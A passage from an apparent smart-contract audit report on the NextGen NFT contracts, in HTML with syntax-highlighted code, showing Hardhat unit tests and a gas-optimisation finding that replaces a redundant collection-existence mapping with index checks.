class=\"mtk7\">100</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMin</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">MAX_TOTAL_SUPPLY</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMax</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">MAX_TOTAL_SUPPLY</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">SUPPLY</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD mint token&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addMinterContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addRandomizer</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionCosts</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionMintCost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionEndMintCost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _rate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _timePeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _salesOptions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// delAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionPhases</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1696931278</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _allowlistStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1696931278</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _allowlistEndTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1696931278</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _publicStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1700019791</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _publicEndTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// _merkleRoot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _numberOfTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _maxAllowance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&#39;{&quot;tdh&quot;: &quot;100&quot;}&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _tokenData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _mintTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk8\">&quot;0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870&quot;</span><span class=\"mtk1\">], </span><span class=\"mtk3\">// _merkleRoot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _delegator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//_varg0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD burn valid token&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">min</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMin</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">min</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reverted</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD successfully set final supply&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">time</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseTo</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1700019900</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setFinalSupply</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reverted</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD successfully get token name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">min</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMin</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// @audit getTokenName was changed to public for the purpose of unit testing.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTokenName</span><span class=\"mtk1\">(</span><span class=\"mtk12\">min</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk4\">n</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;TestCollection #1&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n</details>\n<h2 id=\"g-02-remove-redundant-flag-for-creation-of-collection\" style=\"position:relative;\"><a href=\"#g-02-remove-redundant-flag-for-creation-of-collection\" aria-label=\"g 02 remove redundant flag for creation of collection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Remove redundant flag for creation of collection</h2>\n<p><strong>34,044 gas can be saved.</strong></p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n<th>Test Passes?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenCore:createCollection()</code></td>\n<td>252555</td>\n<td>230253</td>\n<td>22302</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:setCollectionData()</code></td>\n<td>199078</td>\n<td>199031</td>\n<td>47</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:updateCollectionInfo()</code></td>\n<td>51993</td>\n<td>51946</td>\n<td>47</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:changeMetadataView()</code></td>\n<td>62755</td>\n<td>62708</td>\n<td>47</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:freezeCollection()</code></td>\n<td>57073</td>\n<td>57026</td>\n<td>47</td>\n<td>Yes</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>Deployment</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenCore</code></td>\n<td>5501771</td>\n<td>5490217</td>\n<td>11554</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"recommendation-19\" style=\"position:relative;\"><a href=\"#recommendation-19\" aria-label=\"recommendation 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The <code>NextGenCore.sol</code> contract uses a storage variable called <code>isCollectionCreated</code> to check if a collection has been created. </p>\n<p>Alternatively, the existence of a collection can also be verified by checking if the <code>collectionID</code> is less than <code>newCollectionIndex</code>, since all existing collections will have a value that is less than <code>newCollectionIndex</code>. This optimization saves an expensive storage write during contract creation:</p>\n<p><strong>STEP 1:</strong> Remove the storage variable declaration, and write from <code>createCollection()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">__SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- mapping (uint256 =&gt; bool) private isCollectionCreated;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">__SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function createCollection(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionName = _collectionName;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       isCollectionCreated[newCollectionIndex] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        newCollectionIndex = newCollectionIndex + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">__SNIP__</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L62\">Source: smart-contracts/NextGenCore.sol#L62</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L139\">Source: smart-contracts/NextGenCore.sol#L139</a></p>\n<p><strong>STEP 2:</strong> Refactor the require statements to verify using <code>newCollectionIndex</code> instead in <code>setCollectionData()</code>, <code>updateCollectionInfo()</code>, <code>changeMetadataView()</code>, and  <code>freezeCollection()</code>. It also verifies that <code>collectionID</code> greater than zero since <code>newCollectionIndex</code> starts with 1.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- require((isCollectionCreated[_collectionID] == true) &amp;&amp; (collectionFreeze[_collectionID] == false) &amp;&amp; (_collectionTotalSupply &lt;= 10000000000), &quot;err/freezed&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ require((_collectionID &gt; 0 &amp;&amp; _collectionID &lt; newCollectionIndex) &amp;&amp; (collectionFreeze[_collectionID] == false) &amp;&amp; (_collectionTotalSupply &lt;= 10000000000), &quot;err/freezed&quot;);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L148\">Source: smart-contracts/NextGenCore.sol#L148</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- require((isCollectionCreated[_collectionID] == true) &amp;&amp; (collectionFreeze[_collectionID] == false), &quot;Not allowed&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ require((_collectionID &gt; 0 &amp;&amp; _collectionID &lt; newCollectionIndex) &amp;&amp; (collectionFreeze[_collectionID] == false), &quot;Not allowed&quot;);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L239\">Source: smart-contracts/NextGenCore.sol#L239</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- require((isCollectionCreated[_collectionID] == true) &amp;&amp; (collectionFreeze[_collectionID] == false), &quot;Not allowed&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ require(( _collectionID &gt; 0 &amp;&amp; _collectionID &lt; newCollectionIndex) &amp;&amp; (collectionFreeze[_collectionID] == false), &quot;Not allowed&quot;);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L267\">Source: smart-contracts/NextGenCore.sol#L267</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- require(isCollectionCreated[_collectionID] == true, &quot;No Col&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ require((_collectionID &gt; 0 &amp;&amp; _collectionID &lt; newCollectionIndex), &quot;No Col&quot;);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L293\">Source: smart-contracts/NextGenCore.sol#L293</a></p>\n<h3 id=\"poc-6\" style=\"position:relative;\"><a href=\"#poc-6\" aria-label=\"poc 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p><img src=\"https://i.imgur.com/efAqtwT.png\" alt=\"Test Result\"></p>\n<h3 id=\"poc-test-file-1\" style=\"position:relative;\"><a href=\"#poc-test-file-1\" aria-label=\"poc test file 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC test file</h3>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">loadFixture</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;@nomicfoundation/hardhat-toolbox/network-helpers&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;chai&quot;</span><span 